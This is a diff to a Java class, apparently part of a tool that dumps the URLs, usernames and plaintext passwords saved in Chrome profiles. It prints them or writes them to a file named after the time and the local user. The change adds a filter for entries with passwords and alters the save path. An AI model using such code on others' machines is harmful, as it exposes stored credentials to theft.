@@ -16,10 +16,9 @@ import java.util.*;
 
 public class Dumper {
 
-//    private final ChromeAccount[] profiles;
     private final Map<String, ChromeAccount[]> profiles;
 
-        private Dumper(final Map<String, ChromeAccount[]> profiles) {
+    private Dumper(final Map<String, ChromeAccount[]> profiles) {
         this.profiles = profiles;
     }
 
@@ -116,12 +115,11 @@ public class Dumper {
 
     public boolean saveToFile(String newFiePath, String pubKeyPath) throws IOException {
 
-        final List<String> lines = getInfo();
+        final List<String> lines = getInfo(false);
 
-        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
-        File file = new File(newFiePath != null && !newFiePath.equals("")
-                ? newFiePath + System.getProperty("file.separator")
-                : pathToSave,
+//        final String pathToSave = OperatingSystem.getOperatingsystem().getSavePath();
+        File file = new File((newFiePath != null && !newFiePath.equals("") ? newFiePath : ".")
+                + System.getProperty("file.separator"),
                 getCurrentTime() + "-" + System.getProperty("user.name") + ".txt");
 
         if (file.exists()) {
@@ -141,12 +139,13 @@ public class Dumper {
     }
 
     public void show() {
-        final List<String> lines = getInfo();
+        final List<String> lines = getInfo(true);
         lines.forEach(System.out::println);
     }
 
-    private List<String> getInfo() {
+    private List<String> getInfo(boolean onlyWithPsw) {
         final List<String> lines = new ArrayList<>();
+
         for (final String name : profiles.keySet()) {
             final ChromeAccount[] accounts = profiles.get(name);
             lines.add("==================================================");
@@ -154,7 +153,10 @@ public class Dumper {
             lines.add("==================================================");
             if (accounts.length > 0) {
                 for (final ChromeAccount account : accounts) {
-                    if (!account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("")) {
+                    if (onlyWithPsw
+                            ? !account.getPassword().equals("")
+                            : !account.getURL().equals("") || !account.getUsername().equals("") || !account.getPassword().equals("")
+                            ) {
                         lines.add("URL:\t\t" + account.getURL());
                         lines.add("Username:\t" + account.getUsername());
                         lines.add("Password:\t" + account.getPassword());
